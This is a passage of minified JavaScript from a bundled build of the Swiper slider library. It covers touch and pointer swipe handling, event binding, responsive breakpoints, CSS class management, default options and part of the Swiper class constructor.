        d = n.composedPath ? n.composedPath() : n.path;
    c && n.target && n.target.shadowRoot && d && (a = d[0]);
    const p = r.noSwipingSelector ? r.noSwipingSelector : `.${r.noSwipingClass}`,
        u = !!(n.target && n.target.shadowRoot);
    if (r.noSwiping && (u ? Q0(p, a) : a.closest(p))) {
        t.allowClick = !0;
        return
    }
    if (r.swipeHandler && !a.closest(r.swipeHandler)) return;
    o.currentX = n.pageX, o.currentY = n.pageY;
    const g = o.currentX,
        w = o.currentY;
    if (!wl(t, n, g)) return;
    Object.assign(i, {
        isTouched: !0,
        isMoved: !1,
        allowTouchCallbacks: !0,
        isScrolling: void 0,
        startMoving: void 0
    }), o.startX = g, o.startY = w, i.touchStartTime = ci(), t.allowClick = !0, t.updateSize(), t.swipeDirection = void 0, r.threshold > 0 && (i.allowThresholdMove = !1);
    let b = !0;
    a.matches(i.focusableElements) && (b = !1, a.nodeName === "SELECT" && (i.isTouched = !1)), s.activeElement && s.activeElement.matches(i.focusableElements) && s.activeElement !== a && s.activeElement.blur();
    const S = b && t.allowTouchMove && r.touchStartPreventDefault;
    (r.touchStartForcePreventDefault || S) && !a.isContentEditable && n.preventDefault(), r.freeMode && r.freeMode.enabled && t.freeMode && t.animating && !r.cssMode && t.freeMode.onTouchStart(), t.emit("touchStart", n)
}

function e2(e) {
    const t = js(),
        s = this,
        n = s.touchEventsData,
        {
            params: i,
            touches: r,
            rtlTranslate: o,
            enabled: l
        } = s;
    if (!l || !i.simulateTouch && e.pointerType === "mouse") return;
    let a = e;
    if (a.originalEvent && (a = a.originalEvent), a.type === "pointermove" && (n.touchId !== null || a.pointerId !== n.pointerId)) return;
    let c;
    if (a.type === "touchmove") {
        if (c = [...a.changedTouches].filter(M => M.identifier === n.touchId)[0], !c || c.identifier !== n.touchId) return
    } else c = a;
    if (!n.isTouched) {
        n.startMoving && n.isScrolling && s.emit("touchMoveOpposite", a);
        return
    }
    const d = c.pageX,
        p = c.pageY;
    if (a.preventedByNestedSwiper) {
        r.startX = d, r.startY = p;
        return
    }
    if (!s.allowTouchMove) {
        a.target.matches(n.focusableElements) || (s.allowClick = !1), n.isTouched && (Object.assign(r, {
            startX: d,
            startY: p,
            currentX: d,
            currentY: p
        }), n.touchStartTime = ci());
        return
    }
    if (i.touchReleaseOnEdges && !i.loop) {
        if (s.isVertical()) {
            if (p < r.startY && s.translate <= s.maxTranslate() || p > r.startY && s.translate >= s.minTranslate()) {
                n.isTouched = !1, n.isMoved = !1;
                return
            }
        } else if (d < r.startX && s.translate <= s.maxTranslate() || d > r.startX && s.translate >= s.minTranslate()) return
    }
    if (t.activeElement && a.target === t.activeElement && a.target.matches(n.focusableElements)) {
        n.isMoved = !0, s.allowClick = !1;
        return
    }
    n.allowTouchCallbacks && s.emit("touchMove", a), r.previousX = r.currentX, r.previousY = r.currentY, r.currentX = d, r.currentY = p;
    const u = r.currentX - r.startX,
        g = r.currentY - r.startY;
    if (s.params.threshold && Math.sqrt(u ** 2 + g ** 2) < s.params.threshold) return;
    if (typeof n.isScrolling > "u") {
        let M;
        s.isHorizontal() && r.currentY === r.startY || s.isVertical() && r.currentX === r.startX ? n.isScrolling = !1 : u * u + g * g >= 25 && (M = Math.atan2(Math.abs(g), Math.abs(u)) * 180 / Math.PI, n.isScrolling = s.isHorizontal() ? M > i.touchAngle : 90 - M > i.touchAngle)
    }
    if (n.isScrolling && s.emit("touchMoveOpposite", a), typeof n.startMoving > "u" && (r.currentX !== r.startX || r.currentY !== r.startY) && (n.startMoving = !0), n.isScrolling) {
        n.isTouched = !1;
        return
    }
    if (!n.startMoving) return;
    s.allowClick = !1, !i.cssMode && a.cancelable && a.preventDefault(), i.touchMoveStopPropagation && !i.nested && a.stopPropagation();
    let w = s.isHorizontal() ? u : g,
        b = s.isHorizontal() ? r.currentX - r.previousX : r.currentY - r.previousY;
    i.oneWayMovement && (w = Math.abs(w) * (o ? 1 : -1), b = Math.abs(b) * (o ? 1 : -1)), r.diff = w, w *= i.touchRatio, o && (w = -w, b = -b);
    const S = s.touchesDirection;
    s.swipeDirection = w > 0 ? "prev" : "next", s.touchesDirection = b > 0 ? "prev" : "next";
    const x = s.params.loop && !i.cssMode,
        v = s.touchesDirection === "next" && s.allowSlideNext || s.touchesDirection === "prev" && s.allowSlidePrev;
    if (!n.isMoved) {
        if (x && v && s.loopFix({
                direction: s.swipeDirection
            }), n.startTranslate = s.getTranslate(), s.setTransition(0), s.animating) {
            const M = new window.CustomEvent("transitionend", {
                bubbles: !0,
                cancelable: !0
            });
            s.wrapperEl.dispatchEvent(M)
        }
        n.allowMomentumBounce = !1, i.grabCursor && (s.allowSlideNext === !0 || s.allowSlidePrev === !0) && s.setGrabCursor(!0), s.emit("sliderFirstMove", a)
    }
    let y;
    if (new Date().getTime(), n.isMoved && n.allowThresholdMove && S !== s.touchesDirection && x && v && Math.abs(w) >= 1) {
        Object.assign(r, {
            startX: d,
            startY: p,
            currentX: d,
            currentY: p,
            startTranslate: n.currentTranslate
        }), n.loopSwapReset = !0, n.startTranslate = n.currentTranslate;
        return
    }
    s.emit("sliderMove", a), n.isMoved = !0, n.currentTranslate = w + n.startTranslate;
    let C = !0,
        L = i.resistanceRatio;
    if (i.touchReleaseOnEdges && (L = 0), w > 0 ? (x && v && !y && n.allowThresholdMove && n.currentTranslate > (i.centeredSlides ? s.minTranslate() - s.slidesSizesGrid[s.activeIndex + 1] : s.minTranslate()) && s.loopFix({
            direction: "prev",
            setTranslate: !0,
            activeSlideIndex: 0
        }), n.currentTranslate > s.minTranslate() && (C = !1, i.resistance && (n.currentTranslate = s.minTranslate() - 1 + (-s.minTranslate() + n.startTranslate + w) ** L))) : w < 0 && (x && v && !y && n.allowThresholdMove && n.currentTranslate < (i.centeredSlides ? s.maxTranslate() + s.slidesSizesGrid[s.slidesSizesGrid.length - 1] : s.maxTranslate()) && s.loopFix({
            direction: "next",
            setTranslate: !0,
            activeSlideIndex: s.slides.length - (i.slidesPerView === "auto" ? s.slidesPerViewDynamic() : Math.ceil(parseFloat(i.slidesPerView, 10)))
        }), n.currentTranslate < s.maxTranslate() && (C = !1, i.resistance && (n.currentTranslate = s.maxTranslate() + 1 - (s.maxTranslate() - n.startTranslate - w) ** L))), C && (a.preventedByNestedSwiper = !0), !s.allowSlideNext && s.swipeDirection === "next" && n.currentTranslate < n.startTranslate && (n.currentTranslate = n.startTranslate), !s.allowSlidePrev && s.swipeDirection === "prev" && n.currentTranslate > n.startTranslate && (n.currentTranslate = n.startTranslate), !s.allowSlidePrev && !s.allowSlideNext && (n.currentTranslate = n.startTranslate), i.threshold > 0)
        if (Math.abs(w) > i.threshold || n.allowThresholdMove) {
            if (!n.allowThresholdMove) {
                n.allowThresholdMove = !0, r.startX = r.currentX, r.startY = r.currentY, n.currentTranslate = n.startTranslate, r.diff = s.isHorizontal() ? r.currentX - r.startX : r.currentY - r.startY;
                return
            }
        } else {
            n.currentTranslate = n.startTranslate;
            return
        }!i.followFinger || i.cssMode || ((i.freeMode && i.freeMode.enabled && s.freeMode || i.watchSlidesProgress) && (s.updateActiveIndex(), s.updateSlidesClasses()), i.freeMode && i.freeMode.enabled && s.freeMode && s.freeMode.onTouchMove(), s.updateProgress(n.currentTranslate), s.setTranslate(n.currentTranslate))
}

function t2(e) {
    const t = this,
        s = t.touchEventsData;
    let n = e;
    n.originalEvent && (n = n.originalEvent);
    let i;
    if (n.type === "touchend" || n.type === "touchcancel") {
        if (i = [...n.changedTouches].filter(L => L.identifier === s.touchId)[0], !i || i.identifier !== s.touchId) return
    } else {
        if (s.touchId !== null || n.pointerId !== s.pointerId) return;
        i = n
    }
    if (["pointercancel", "pointerout", "pointerleave", "contextmenu"].includes(n.type) && !(["pointercancel", "contextmenu"].includes(n.type) && (t.browser.isSafari || t.browser.isWebView))) return;
    s.pointerId = null, s.touchId = null;
    const {
        params: o,
        touches: l,
        rtlTranslate: a,
        slidesGrid: c,
        enabled: d
    } = t;
    if (!d || !o.simulateTouch && n.pointerType === "mouse") return;
    if (s.allowTouchCallbacks && t.emit("touchEnd", n), s.allowTouchCallbacks = !1, !s.isTouched) {
        s.isMoved && o.grabCursor && t.setGrabCursor(!1), s.isMoved = !1, s.startMoving = !1;
        return
    }
    o.grabCursor && s.isMoved && s.isTouched && (t.allowSlideNext === !0 || t.allowSlidePrev === !0) && t.setGrabCursor(!1);
    const p = ci(),
        u = p - s.touchStartTime;
    if (t.allowClick) {
        const L = n.path || n.composedPath && n.composedPath();
        t.updateClickedSlide(L && L[0] || n.target, L), t.emit("tap click", n), u < 300 && p - s.lastClickTime < 300 && t.emit("doubleTap doubleClick", n)
    }
    if (s.lastClickTime = ci(), Gr(() => {
            t.destroyed || (t.allowClick = !0)
        }), !s.isTouched || !s.isMoved || !t.swipeDirection || l.diff === 0 && !s.loopSwapReset || s.currentTranslate === s.startTranslate && !s.loopSwapReset) {
        s.isTouched = !1, s.isMoved = !1, s.startMoving = !1;
        return
    }
    s.isTouched = !1, s.isMoved = !1, s.startMoving = !1;
    let g;
    if (o.followFinger ? g = a ? t.translate : -t.translate : g = -s.currentTranslate, o.cssMode) return;
    if (o.freeMode && o.freeMode.enabled) {
        t.freeMode.onTouchEnd({
            currentPos: g
        });
        return
    }
    const w = g >= -t.maxTranslate() && !t.params.loop;
    let b = 0,
        S = t.slidesSizesGrid[0];
    for (let L = 0; L < c.length; L += L < o.slidesPerGroupSkip ? 1 : o.slidesPerGroup) {
        const M = L < o.slidesPerGroupSkip - 1 ? 1 : o.slidesPerGroup;
        typeof c[L + M] < "u" ? (w || g >= c[L] && g < c[L + M]) && (b = L, S = c[L + M] - c[L]) : (w || g >= c[L]) && (b = L, S = c[c.length - 1] - c[c.length - 2])
    }
    let x = null,
        v = null;
    o.rewind && (t.isBeginning ? v = o.virtual && o.virtual.enabled && t.virtual ? t.virtual.slides.length - 1 : t.slides.length - 1 : t.isEnd && (x = 0));
    const y = (g - c[b]) / S,
        C = b < o.slidesPerGroupSkip - 1 ? 1 : o.slidesPerGroup;
    if (u > o.longSwipesMs) {
        if (!o.longSwipes) {
            t.slideTo(t.activeIndex);
            return
        }
        t.swipeDirection === "next" && (y >= o.longSwipesRatio ? t.slideTo(o.rewind && t.isEnd ? x : b + C) : t.slideTo(b)), t.swipeDirection === "prev" && (y > 1 - o.longSwipesRatio ? t.slideTo(b + C) : v !== null && y < 0 && Math.abs(y) > o.longSwipesRatio ? t.slideTo(v) : t.slideTo(b))
    } else {
        if (!o.shortSwipes) {
            t.slideTo(t.activeIndex);
            return
        }
        t.navigation && (n.target === t.navigation.nextEl || n.target === t.navigation.prevEl) ? n.target === t.navigation.nextEl ? t.slideTo(b + C) : t.slideTo(b) : (t.swipeDirection === "next" && t.slideTo(x !== null ? x : b + C), t.swipeDirection === "prev" && t.slideTo(v !== null ? v : b))
    }
}

function xl() {
    const e = this,
        {
            params: t,
            el: s
        } = e;
    if (s && s.offsetWidth === 0) return;
    t.breakpoints && e.setBreakpoint();
    const {
        allowSlideNext: n,
        allowSlidePrev: i,
        snapGrid: r
    } = e, o = e.virtual && e.params.virtual.enabled;
    e.allowSlideNext = !0, e.allowSlidePrev = !0, e.updateSize(), e.updateSlides(), e.updateSlidesClasses();
    const l = o && t.loop;
    (t.slidesPerView === "auto" || t.slidesPerView > 1) && e.isEnd && !e.isBeginning && !e.params.centeredSlides && !l ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.params.loop && !o ? e.slideToLoop(e.realIndex, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0), e.autoplay && e.autoplay.running && e.autoplay.paused && (clearTimeout(e.autoplay.resizeTimeout), e.autoplay.resizeTimeout = setTimeout(() => {
        e.autoplay && e.autoplay.running && e.autoplay.paused && e.autoplay.resume()
    }, 500)), e.allowSlidePrev = i, e.allowSlideNext = n, e.params.watchOverflow && r !== e.snapGrid && e.checkOverflow()
}

function s2(e) {
    const t = this;
    t.enabled && (t.allowClick || (t.params.preventClicks && e.preventDefault(), t.params.preventClicksPropagation && t.animating && (e.stopPropagation(), e.stopImmediatePropagation())))
}

function n2() {
    const e = this,
        {
            wrapperEl: t,
            rtlTranslate: s,
            enabled: n
        } = e;
    if (!n) return;
    e.previousTranslate = e.translate, e.isHorizontal() ? e.translate = -t.scrollLeft : e.translate = -t.scrollTop, e.translate === 0 && (e.translate = 0), e.updateActiveIndex(), e.updateSlidesClasses();
    let i;
    const r = e.maxTranslate() - e.minTranslate();
    r === 0 ? i = 0 : i = (e.translate - e.minTranslate()) / r, i !== e.progress && e.updateProgress(s ? -e.translate : e.translate), e.emit("setTranslate", e.translate, !1)
}

function i2(e) {
    const t = this;
    ei(t, e.target), !(t.params.cssMode || t.params.slidesPerView !== "auto" && !t.params.autoHeight) && t.update()
}

function r2() {
    const e = this;
    e.documentTouchHandlerProceeded || (e.documentTouchHandlerProceeded = !0, e.params.touchReleaseOnEdges && (e.el.style.touchAction = "auto"))
}
const md = (e, t) => {
    const s = js(),
        {
            params: n,
            el: i,
            wrapperEl: r,
            device: o
        } = e,
        l = !!n.nested,
        a = t === "on" ? "addEventListener" : "removeEventListener",
        c = t;
    s[a]("touchstart", e.onDocumentTouchStart, {
        passive: !1,
        capture: l
    }), i[a]("touchstart", e.onTouchStart, {
        passive: !1
    }), i[a]("pointerdown", e.onTouchStart, {
        passive: !1
    }), s[a]("touchmove", e.onTouchMove, {
        passive: !1,
        capture: l
    }), s[a]("pointermove", e.onTouchMove, {
        passive: !1,
        capture: l
    }), s[a]("touchend", e.onTouchEnd, {
        passive: !0
    }), s[a]("pointerup", e.onTouchEnd, {
        passive: !0
    }), s[a]("pointercancel", e.onTouchEnd, {
        passive: !0
    }), s[a]("touchcancel", e.onTouchEnd, {
        passive: !0
    }), s[a]("pointerout", e.onTouchEnd, {
        passive: !0
    }), s[a]("pointerleave", e.onTouchEnd, {
        passive: !0
    }), s[a]("contextmenu", e.onTouchEnd, {
        passive: !0
    }), (n.preventClicks || n.preventClicksPropagation) && i[a]("click", e.onClick, !0), n.cssMode && r[a]("scroll", e.onScroll), n.updateOnWindowResize ? e[c](o.ios || o.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", xl, !0) : e[c]("observerUpdate", xl, !0), i[a]("load", e.onLoad, {
        capture: !0
    })
};

function o2() {
    const e = this,
        {
            params: t
        } = e;
    e.onTouchStart = J0.bind(e), e.onTouchMove = e2.bind(e), e.onTouchEnd = t2.bind(e), e.onDocumentTouchStart = r2.bind(e), t.cssMode && (e.onScroll = n2.bind(e)), e.onClick = s2.bind(e), e.onLoad = i2.bind(e), md(e, "on")
}

function a2() {
    md(this, "off")
}
var l2 = {
    attachEvents: o2,
    detachEvents: a2
};
const _l = (e, t) => e.grid && t.grid && t.grid.rows > 1;

function c2() {
    const e = this,
        {
            realIndex: t,
            initialized: s,
            params: n,
            el: i
        } = e,
        r = n.breakpoints;
    if (!r || r && Object.keys(r).length === 0) return;
    const o = e.getBreakpoint(r, e.params.breakpointsBase, e.el);
    if (!o || e.currentBreakpoint === o) return;
    const a = (o in r ? r[o] : void 0) || e.originalParams,
        c = _l(e, n),
        d = _l(e, a),
        p = n.enabled;
    c && !d ? (i.classList.remove(`${n.containerModifierClass}grid`, `${n.containerModifierClass}grid-column`), e.emitContainerClasses()) : !c && d && (i.classList.add(`${n.containerModifierClass}grid`), (a.grid.fill && a.grid.fill === "column" || !a.grid.fill && n.grid.fill === "column") && i.classList.add(`${n.containerModifierClass}grid-column`), e.emitContainerClasses()), ["navigation", "pagination", "scrollbar"].forEach(x => {
        if (typeof a[x] > "u") return;
        const v = n[x] && n[x].enabled,
            y = a[x] && a[x].enabled;
        v && !y && e[x].disable(), !v && y && e[x].enable()
    });
    const u = a.direction && a.direction !== n.direction,
        g = n.loop && (a.slidesPerView !== n.slidesPerView || u),
        w = n.loop;
    u && s && e.changeDirection(), Je(e.params, a);
    const b = e.params.enabled,
        S = e.params.loop;
    Object.assign(e, {
        allowTouchMove: e.params.allowTouchMove,
        allowSlideNext: e.params.allowSlideNext,
        allowSlidePrev: e.params.allowSlidePrev
    }), p && !b ? e.disable() : !p && b && e.enable(), e.currentBreakpoint = o, e.emit("_beforeBreakpoint", a), s && (g ? (e.loopDestroy(), e.loopCreate(t), e.updateSlides()) : !w && S ? (e.loopCreate(t), e.updateSlides()) : w && !S && e.loopDestroy()), e.emit("breakpoint", a)
}

function d2(e, t, s) {
    if (t === void 0 && (t = "window"), !e || t === "container" && !s) return;
    let n = !1;
    const i = st(),
        r = t === "window" ? i.innerHeight : s.clientHeight,
        o = Object.keys(e).map(l => {
            if (typeof l == "string" && l.indexOf("@") === 0) {
                const a = parseFloat(l.substr(1));
                return {
                    value: r * a,
                    point: l
                }
            }
            return {
                value: l,
                point: l
            }
        });
    o.sort((l, a) => parseInt(l.value, 10) - parseInt(a.value, 10));
    for (let l = 0; l < o.length; l += 1) {
        const {
            point: a,
            value: c
        } = o[l];
        t === "window" ? i.matchMedia(`(min-width: ${c}px)`).matches && (n = a) : c <= s.clientWidth && (n = a)
    }
    return n || "max"
}
var f2 = {
    setBreakpoint: c2,
    getBreakpoint: d2
};

function p2(e, t) {
    const s = [];
    return e.forEach(n => {
        typeof n == "object" ? Object.keys(n).forEach(i => {
            n[i] && s.push(t + i)
        }) : typeof n == "string" && s.push(t + n)
    }), s
}

function u2() {
    const e = this,
        {
            classNames: t,
            params: s,
            rtl: n,
            el: i,
            device: r
        } = e,
        o = p2(["initialized", s.direction, {
            "free-mode": e.params.freeMode && s.freeMode.enabled
        }, {
            autoheight: s.autoHeight
        }, {
            rtl: n
        }, {
            grid: s.grid && s.grid.rows > 1
        }, {
            "grid-column": s.grid && s.grid.rows > 1 && s.grid.fill === "column"
        }, {
            android: r.android
        }, {
            ios: r.ios
        }, {
            "css-mode": s.cssMode
        }, {
            centered: s.cssMode && s.centeredSlides
        }, {
            "watch-progress": s.watchSlidesProgress
        }], s.containerModifierClass);
    t.push(...o), i.classList.add(...t), e.emitContainerClasses()
}

function h2() {
    const e = this,
        {
            el: t,
            classNames: s
        } = e;
    t.classList.remove(...s), e.emitContainerClasses()
}
var g2 = {
    addClasses: u2,
    removeClasses: h2
};

function m2() {
    const e = this,
        {
            isLocked: t,
            params: s
        } = e,
        {
            slidesOffsetBefore: n
        } = s;
    if (n) {
        const i = e.slides.length - 1,
            r = e.slidesGrid[i] + e.slidesSizesGrid[i] + n * 2;
        e.isLocked = e.size > r
    } else e.isLocked = e.snapGrid.length === 1;
    s.allowSlideNext === !0 && (e.allowSlideNext = !e.isLocked), s.allowSlidePrev === !0 && (e.allowSlidePrev = !e.isLocked), t && t !== e.isLocked && (e.isEnd = !1), t !== e.isLocked && e.emit(e.isLocked ? "lock" : "unlock")
}
var v2 = {
        checkOverflow: m2
    },
    Kr = {
        init: !0,
        direction: "horizontal",
        oneWayMovement: !1,
        touchEventsTarget: "wrapper",
        initialSlide: 0,
        speed: 300,
        cssMode: !1,
        updateOnWindowResize: !0,
        resizeObserver: !0,
        nested: !1,
        createElements: !1,
        eventsPrefix: "swiper",
        enabled: !0,
        focusableElements: "input, select, option, textarea, button, video, label",
        width: null,
        height: null,
        preventInteractionOnTransition: !1,
        userAgent: null,
        url: null,
        edgeSwipeDetection: !1,
        edgeSwipeThreshold: 20,
        autoHeight: !1,
        setWrapperSize: !1,
        virtualTranslate: !1,
        effect: "slide",
        breakpoints: void 0,
        breakpointsBase: "window",
        spaceBetween: 0,
        slidesPerView: 1,
        slidesPerGroup: 1,
        slidesPerGroupSkip: 0,
        slidesPerGroupAuto: !1,
        centeredSlides: !1,
        centeredSlidesBounds: !1,
        slidesOffsetBefore: 0,
        slidesOffsetAfter: 0,
        normalizeSlideIndex: !0,
        centerInsufficientSlides: !1,
        watchOverflow: !0,
        roundLengths: !1,
        touchRatio: 1,
        touchAngle: 45,
        simulateTouch: !0,
        shortSwipes: !0,
        longSwipes: !0,
        longSwipesRatio: .5,
        longSwipesMs: 300,
        followFinger: !0,
        allowTouchMove: !0,
        threshold: 5,
        touchMoveStopPropagation: !1,
        touchStartPreventDefault: !0,
        touchStartForcePreventDefault: !1,
        touchReleaseOnEdges: !1,
        uniqueNavElements: !0,
        resistance: !0,
        resistanceRatio: .85,
        watchSlidesProgress: !1,
        grabCursor: !1,
        preventClicks: !0,
        preventClicksPropagation: !0,
        slideToClickedSlide: !1,
        loop: !1,
        loopAddBlankSlides: !0,
        loopAdditionalSlides: 0,
        loopPreventsSliding: !0,
        rewind: !1,
        allowSlidePrev: !0,
        allowSlideNext: !0,
        swipeHandler: null,
        noSwiping: !0,
        noSwipingClass: "swiper-no-swiping",
        noSwipingSelector: null,
        passiveListeners: !0,
        maxBackfaceHiddenSlides: 10,
        containerModifierClass: "swiper-",
        slideClass: "swiper-slide",
        slideBlankClass: "swiper-slide-blank",
        slideActiveClass: "swiper-slide-active",
        slideVisibleClass: "swiper-slide-visible",
        slideFullyVisibleClass: "swiper-slide-fully-visible",
        slideNextClass: "swiper-slide-next",
        slidePrevClass: "swiper-slide-prev",
        wrapperClass: "swiper-wrapper",
        lazyPreloaderClass: "swiper-lazy-preloader",
        lazyPreloadPrevNext: 0,
        runCallbacksOnInit: !0,
        _emitClasses: !1
    };

function y2(e, t) {
    return function(n) {
        n === void 0 && (n = {});
        const i = Object.keys(n)[0],
            r = n[i];
        if (typeof r != "object" || r === null) {
            Je(t, n);
            return
        }
        if (e[i] === !0 && (e[i] = {
                enabled: !0
            }), i === "navigation" && e[i] && e[i].enabled && !e[i].prevEl && !e[i].nextEl && (e[i].auto = !0), ["pagination", "scrollbar"].indexOf(i) >= 0 && e[i] && e[i].enabled && !e[i].el && (e[i].auto = !0), !(i in e && "enabled" in r)) {
            Je(t, n);
            return
        }
        typeof e[i] == "object" && !("enabled" in e[i]) && (e[i].enabled = !0), e[i] || (e[i] = {
            enabled: !1
        }), Je(t, n)
    }
}
const mr = {
        eventsEmitter: g0,
        update: T0,
        translate: M0,
        transition: R0,
        slide: U0,
        loop: K0,
        grabCursor: Y0,
        events: l2,
        breakpoints: f2,
        checkOverflow: v2,
        classes: g2
    },
    vr = {};
let Ho = class It {
    constructor() {
        let t, s;
        for (var n = arguments.length, i = new Array(n), r = 0; r < n; r++) i[r] = arguments[r];
        i.length === 1 && i[0].constructor && Object.prototype.toString.call(i[0]).slice(8, -1) === "Object" ? s = i[0] : [t, s] = i, s || (s = {}), s = Je({}, s), t && !s.el && (s.el = t);
        const o = js();
        if (s.el && typeof s.el == "string" && o.querySelectorAll(s.el).length > 1) {
            const d = [];
            return o.querySelectorAll(s.el).forEach(p => {
                const u = Je({}, s, {
                    el: p
                });
                d.push(new It(u))
            }), d
        }
        const l = this;
        l.__swiper__ = !0, l.support = hd(), l.device = d0({
            userAgent: s.userAgent
        }), l.browser = p0(), l.eventsListeners = {}, l.eventsAnyListeners = [], l.modules = [...l.__modules__], s.modules && Array.isArray(s.modules) && l.modules.push(...s.modules);
        const a = {};
        l.modules.forEach(d => {
            d({
                params: s,
                swiper: l,
                extendParams: y2(s, a),
                on: l.on.bind(l),
                once: l.once.bind(l),
                off: l.off.bind(l),
                emit: l.emit.bind(l)
            })
        });
        const c = Je({}, Kr, a);
        return l.params = Je({}, c, vr, s), l.originalParams = Je({}, l.params), l.passedParams = Je({}, s), l.params && l.params.on && Object.keys(l.params.on).forEach(d => {
            l.on(d, l.params.on[d])
        }), l.params && l.params.onAny && l.onAny(l.params.onAny), Object.assign(l, {
            enabled: l.params.enabled,
            el: t,
            classNames: [],
            slides: [],
            slidesGrid: [],
            snapGrid: [],
            slidesSizesGrid: [],
            isHorizontal() {
                return l.params.direction === "horizontal"
            },
            isVertical() {
                return l.params.direction === "vertical"
            },
            activeIndex: 0,
            realIndex: 0,
            isBeginning: !0,
            isEnd: !1,
            translate: 0,
            previousTranslate: 0,
            progress: 0,
            velocity: 0,
            animating: !1,
            cssOverflowAdjustment() {
                return Math.trunc(this.translate / 2 ** 23) * 2 ** 23
            },
            allowSlideNext: l.params.allowSlideNext,
            allowSlidePrev: l.params.allowSlidePrev,
            touchEventsData: {
                isTouched: void 0,
                isMoved: void 0,
                allowTouchCallbacks: void 0,
                touchStartTime: void 0,
                isScrolling: void 0,
                currentTranslate: void 0,
                startTranslate: void 0,
                allowThresholdMove: void 0,
                focusableElements: l.params.focusableElements,
                lastClickTime: 0,
                clickTimeout: void 0,
                velocities: [],
                allowMomentumBounce: void 0,
                startMoving: void 0,
                pointerId: null,
                touchId: null
            },
            allowClick: !0,
            allowTouchMove: l.params.allowTouchMove,
            touches: {
                startX: 0,
                startY: 0,
                currentX: 0,
                currentY: 0,
                diff: 0
            },
            imagesToLoad: [],
            imagesLoaded: 0
        }), l.emit("_swiper"), l.params.init && l.init(), l
    }
    getDirectionLabel(t) {
        return this.isHorizontal() ? t : {
            width: "height",
            "margin-top": "margin-left",
            "margin-bottom ": "margin-right",
            "margin-left": "margin-top",
            "margin-right": "margin-bottom",
            "padding-left": "padding-top",
            "padding-right": "padding-bottom",
            marginRight: "marginBottom"
        }[t]
    }
    getSlideIndex(t) {
        const {
            slidesEl: s,
            params: n
        } = this, i = Ct(s, `.${n.slideClass}, swiper-slide`), r = pi(i[0]);
        return pi(t) - r
    }
    getSlideIndexByData(t) {
        return this.getSlideIndex(this.slides.filter(s => s.getAttribute("data-swiper-slide-index") * 1 === t)[0])
    }
    recalcSlides() {
        const t = this,
            {
                slidesEl: s,
                params: n
            } = t;
        t.slides = Ct(s, `.${n.slideClass}, swiper-slide`)
    }
    enable() {
        const t = this;
        t.enabled || (t.enabled = !0, t.params.grabCursor && t.setGrabCursor(), t.emit("enable"))
    }
    disable() {
        const t = this;
        t.enabled && (t.enabled = !1, t.params.grabCursor && t.unsetGrabCursor(), t.emit("disable"))
    }
    setProgress(t, s) {
        const n = this;
        t = Math.min(Math.max(t, 0), 1);
        const i = n.minTranslate(),
            o = (n.maxTranslate() - i) * t + i;
        n.translateTo(o, typeof s > "u" ? 0 : s), n.updateActiveIndex(), n.updateSlidesClasses()
    }
    emitContainerClasses() {
        const t = this;
        if (!t.params._emitClasses || !t.el) return;
        const s = t.el.className.split(" ").filter(n => n.indexOf("swiper") === 0 || n.indexOf(t.params.containerModifierClass) === 0);
        t.emit("_containerClasses", s.join(" "))
    }
    getSlideClasses(t) {
        const s = this;
        return s.destroyed ? "" : t.className.split(" ").filter(n => n.indexOf("swiper-slide") === 0 || n.indexOf(s.params.slideClass) === 0).join(" ")
    }
    emitSlidesClasses() {
        const t = this;
        if (!t.params._emitClasses || !t.el) return;
        const s = [];
        t.slides.forEach(n => {
            const i = t.getSlideClasses(n);
            s.push({
                slideEl: n,
                classNames: i
            }), t.emit("_slideClass", n, i)
        }), t.emit("_slideClasses", s)
    }
    slidesPerViewDynamic(t, s) {
        t === void 0 && (t = "current"), s === void 0 && (s = !1);
        const n = this,
            {
                params: i,
                slides: r,
                slidesGrid: o,
                slidesSizesGrid: l,
                size: a,
                activeIndex: c
            } = n;
        let d = 1;
        if (typeof i.slidesPerView == "number") return i.slidesPerView;
        if (i.centeredSlides) {
            let p = r[c] ? r[c].swiperSlideSize : 0,
                u;
            for (let g = c + 1; g < r.length; g += 1) r[g] && !u && (p += r[g].swiperSlideSize, d += 1, p > a && (u = !0));
            for (let g = c - 1; g >= 0; g -= 1) r[g] && !u && (p += r[g].swiperSlideSize, d += 1, p > a && (u = !0))
        } else if (t === "current")
            for (let p = c + 1; p < r.length; p += 1)(s ? o[p] + l[p] - o[c] < a : o[p] - o[c] < a) && (d += 1);
        else
            for (let p = c - 1; p >= 0; p -= 1) o[c] - o[p] < a && (d += 1);
        return d
    }
    update() {
        const t = this;
        if (!t || t.destroyed) return;
        const {
            snapGrid: s,
            params: n
        } = t;
        n.breakpoints && t.setBreakpoint(), [...t.el.querySelectorAll('[loading="lazy"]')].forEach(o => {
            o.complete && ei(t, o)
        }), t.updateSize(), t.updateSlides(), t.updateProgress(), t.updateSlidesClasses();

        function i() {
            const o = t.rtlTranslate ? t.translate * -1 : t.translate,
                l = Math.min(Math.max(o, t.maxTranslate()), t.minTranslate());
            t.setTranslate(l), t.updateActiveIndex(), t.updateSlidesClasses()
        }
        let r;
        if (n.freeMode && n.freeMode.enabled && !n.cssMode) i(), n.autoHeight && t.updateAutoHeight();
        else {
            if ((n.slidesPerView === "auto" || n.slidesPerView > 1) && t.isEnd && !n.centeredSlides) {
                const o = t.virtual && n.virtual.enabled ? t.virtual.slides : t.slides;
                r = t.slideTo(o.length - 1, 0, !1, !0)
            } else r = t.slideTo(t.activeIndex, 0, !1, !0);
            r || i()
        }
        n.watchOverflow && s !== t.snapGrid && t.checkOverflow(), t.emit("update")
    }
    changeDirection(t, s) {
        s === void 0 && (s = !0);
        const n = this,
            i = n.params.direction;
        return t || (t = i === "horizontal" ? "vertical" : "horizontal"), t === i || t !== "horizontal" && t !== "vertical" || (n.el.classList.remove(`${n.params.containerModifierClass}${i}`), n.el.classList.add(`${n.params.containerModifierClass}${t}`), n.emitContainerClasses(), n.params.direction = t, n.slides.forEach(r => {
            t === "vertical" ? r.style.width = "" : r.style.height = ""
        }), n.emit("changeDirection"), s && n.update()), n
    }
    changeLanguageDirection(t) {
        const s = this;
        s.rtl && t === "rtl" || !s.rtl && t === "ltr" || (s.rtl = t === "rtl", s.rtlTranslate = s.params.direction === "horizontal" && s.rtl, s.rtl ? (s.el.classList.add(`${s.params.containerModifierClass}rtl`), s.el.dir = "rtl") : (s.el.classList.remove(`${s.params.containerModifierClass}rtl`), s.el.dir = "ltr"), s.update())
    }
    mount(t) {
        const s = this;
        if (s.mounted) return !0;
        let n = t || s.params.el;
